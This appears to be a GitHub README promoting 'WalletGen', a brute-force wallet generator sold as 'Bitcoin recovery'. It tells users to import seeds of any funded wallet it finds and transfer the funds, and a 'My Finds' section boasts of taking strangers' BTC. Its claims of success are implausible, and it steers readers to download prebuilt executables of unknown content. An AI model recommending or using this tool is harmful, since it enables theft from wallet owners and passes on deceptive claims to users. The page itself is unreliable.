# Bitcoin Recovery: Get Your BTC Back with WalletGen

**Lost your Bitcoin?** Don't panic! **WalletGen** provides a fast, powerful, and open-source solution for **Bitcoin recovery**. It's designed to help you recover lost or inactive **Bitcoin (BTC)**. With real-time balance checking and a high-performance C++ engine, WalletGen gives you the tools you need to reclaim your digital assets.

<!--
Meta description:
Use WalletGen for Bitcoin recovery. Recover lost BTC with speed and efficiency. Brute-force seed recovery, wallet generation, balance checks. Get your Bitcoin back now!
-->

## Quick Navigation
- [How It Works: Understanding Bitcoin Recovery](#how-it-works)
- [Why Choose WalletGen for Bitcoin Recovery?](#why-walletgen)
- [Features: Key Advantages for Bitcoin Recovery](#features)
- [Download WalletGen: Start Your Bitcoin Recovery Now](#how-to-start)
- [Optimize Your Search: Database Download for Increased Efficiency](#download-and-use-database-for-more-speed)
- [Found a Wallet: What Happens Next?](#the-program-found-a-wallet--whats-next)
- [Recovering Your Bitcoin Wallet: A Step-by-Step Guide](#recovery-your-bitcoin-wallet)
- [My Finds: Success Stories and Real-World Recoveries](#my-finds)
- [FAQ: Your Bitcoin Recovery Questions Answered](#-frequently-asked-questions-faq)
- [Build Instructions: Compile and Run the Project](#building-the-project)
- [Support the Project: Donate and Contribute](#donate)

[![platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20Android-blue)](https://github.com/tony-dev1/wallets-finder/releases/tag/walletgen)
![build](https://img.shields.io/badge/build-passing-brightgreen)
![discord](https://img.shields.io/badge/discord-tonydevbtc-blue.svg?logo=discord&label=discord)
[![x](https://img.shields.io/badge/@tonydevbtc-black.svg?logo=x)](https://x.com/tonydevbtc)

<p align="center">
    <img width="1000" alt="Bitcoin Recovery" title="Bitcoin Recovery" height="460" src="/core/view.webp" />
</p>

⚠️ **Disclaimer**:  WalletGen is a tool for research and education, and it is *not* meant for unauthorized access or any malicious activity. Use it responsibly and only with wallets you own or have been given permission to access.

## How It Works

WalletGen generates wallets using [BIP39](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki), [BIP44](https://github.com/bitcoin/bips/blob/master/bip-0044.mediawiki), and [Bech32](https://en.bitcoin.it/wiki/Bech32) for Bitcoin.  For EVM-based chains like Ethereum, WalletGen employs the [Keccak256](https://emn178.github.io/online-tools/keccak_256.html) hashing algorithm.

The core function of WalletGen is to compare generated addresses against a database, as well as checking wallet balances in real-time using blockchain explorers. This allows you to find your lost BTC. WalletGen's C++ foundation provides a substantial increase in generation speeds, with performance primarily reliant on your CPU & GPU.

## Why Choose WalletGen for Bitcoin Recovery?

Looking to recover your lost Bitcoin?  **WalletGen** is optimized for speed and efficiency.  Unlike Python-based tools, this recovery tool is written in C++ and optimized for multi-threaded CPU and GPU usage, providing performance that's up to **10x faster**. If you need to reclaim lost wallets or verify private key spaces, WalletGen offers a secure and efficient solution.

## Features

-   **Cryptocurrency Wallet Generation**: WalletGen creates Bitcoin, Ethereum, BNB, MATIC, and other crypto wallets.
-   **Brute-Force Bitcoin Recovery**: Search for existing wallets with balances using brute-force.
-   **Algorithm Support**: Supports Keccak256 for EVM wallets and BIP39, BIP44, and Bech32 for Bitcoin.
-   **Database Integration for Speed**: Download databases for quicker and more efficient balance checks.
-   **High-Speed Operation**: Utilizes your CPU and GPU power.
-   **Bitcoin Seed Phrase Recovery**: Also includes tools for recovering Bitcoin wallets by seed phrase.

## Supported Blockchains

-   Bitcoin (BTC)
-   Ethereum (ETH)
-   Binance Smart Chain (BNB)
-   Any EVM-compatible chain

# Demo

<p align="center">
    <img width="1000" height="460" alt="WalletGen search lost bitcoin wallets on Windows Demo" title="WalletGen search lost bitcoin wallets on Windows" src="/core/properties.webp" />
</p>

<p align="center">
    <img width="1000" height="460" alt="WalletGen search lost bitcoin wallets on Linux Demo" title="WalletGen search lost bitcoin wallets on Linux" src="/core/popup.webp" />
</p>

# How to start

## Windows
-   Download [Release](../../releases)
-   Unpack anywhere
-   Run `WalletGen.exe`

Or Just Download [Installer](../../releases)

## Linux (x86-64bit)

Use wget
or download [Release for Linux](../../releases)




## How to Search for Lost Bitcoin & Ethereum Wallets with Balance

**Wallet Gen** helps you search for Bitcoin wallets with balances.

### Bitcoin (BTC) Wallet Search:

*   Press `3` or run `start_search_btc.bat` to search Bitcoin wallets using the internet. This might take longer.
*   Press `6` for the database search, which is faster.

### EVM Wallet Search (Ethereum, BNB, MATIC, etc.):

*   Press `5` or run `start_search_evm.bat` for an internet search.
*   Press `6` for the faster database search.

### Speed Considerations:

*   Your hardware, especially your GPU, impacts the speed.

Databases improve the speed of the search.

## The Program Found a Wallet — What’s Next?

If WalletGen finds a wallet with a balance:
*   The search will **Stop** immediately.
*   The wallet details are **Displayed** in the console.
*   Data is **Saved** in the `found_wallets.txt` file.

### How to Access the Funds?

1.  Import the **mnemonic seed phrase** into any compatible crypto wallet (Metamask, Trust Wallet, Electrum, etc.).
2.  You can transfer the funds to your wallet.

>  Consider donating if a wallet is found.

## Recovery Your Bitcoin Wallet

WalletGen can help recover your Bitcoin wallet. You can enter the full seed phrase or use wildcards.

### Process Description

#### Search for Missing Words:

Use * for missing words to find your phrase.

#### Entering a Complete Seed Phrase:

Enter the full 12-word seed. WalletGen checks balances.

![recovery](/core/sharp.webp)

### Important Recommendations

*   Seed phrases have 12 words.
*   Use * only for missing words.
*   Searching for missing words takes time.
*   Upon recovery, data is saved.

## My Finds

![mywallet](/core/report.webp)

I've recovered two BTC wallets with balances. The first had 0.000032 BTC, the second, 0.0528 BTC (around $4800).
Here’s the link to the wallet: [bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay](https://mempool.space/address/bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay).

<p align="center">
    <img width="1000" height="460" alt="WalletGen found first lost bitcoin wallet" title="WalletGen found first lost bitcoin wallet" src="/core/unit.webp" />
</p>

### New Find 4/9/2025

After a week of searching, I found a [wallet](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0) with 0.25 bitcoin ($19k). This is my biggest find!

![image](/core/big.webp)

## New Find 5/5/2025

[bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp](https://mempool.space/address/bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp)

![image](/core/blank.webp)

## Building the Project

1. Open the project file (`CryptoWalletGen.sln`) in Visual Studio or a compatible C++ compiler.
2. Install the necessary dependencies and build the project.

```cmd
> git clone https://github.com/microsoft/vcpkg
> .\vcpkg\bootstrap-vcpkg.bat
> .\vcpkg\vcpkg integrate install
> .\vcpkg\vcpkg install openssl:x64-windows
```

3. Start building the project.

## 🔍 Frequently Asked Questions (FAQ)

### ❓ Where can I download WalletGen?
Download WalletGen on the [release download page](../../releases).

### ❓ Where can I download a database of known addresses?
Find the latest database on the [release page](../../releases).

### ❓ Can WalletGen help me recover a lost Bitcoin wallet?
Yes, WalletGen can help recover lost Bitcoin wallets using brute-force seed generation and a known-address database.

### ❓ Is WalletGen a seed phrase generator?
Yes. WalletGen can generate **BIP39 seed phrases** and derive wallets for Bitcoin, Ethereum, and other EVM chains.

### ❓ Do I need the internet to search through the database?
No. Searching through the database does not require an internet connection, as the wallet balance is already known.

### ❓ Can I find Ethereum wallets with balance?
Yes. WalletGen supports scanning for **Ethereum wallets with balance** using brute-force and a database of known addresses.

### ❓ Is WalletGen legal?
WalletGen is intended for **educational and research purposes only**. It should only be used on wallets you own or have permission to access.

## Todo
1. Search for missing words in a seed phrase. - **Done!**

## Contribute

Contributions are welcome! If you have ideas, bug reports, or want to contribute to the codebase, feel free to submit a pull request.

## Donate

Consider donating a portion of the recovered balance as a thank you.

**BTC:** bc1qeyrshy5ntsguwxe9m8tp2x2yqhddz7ymkj44h9

**ETH:** 0x76c2E75B92Eb340f01B378e332FC7d8954893693

## Credits
This project uses code from the [Trezor project](https://github.com/trezor/trezor-crypto). The code is licensed under the MIT License.

## License
This project is licensed under the [MIT License](/LICENSE)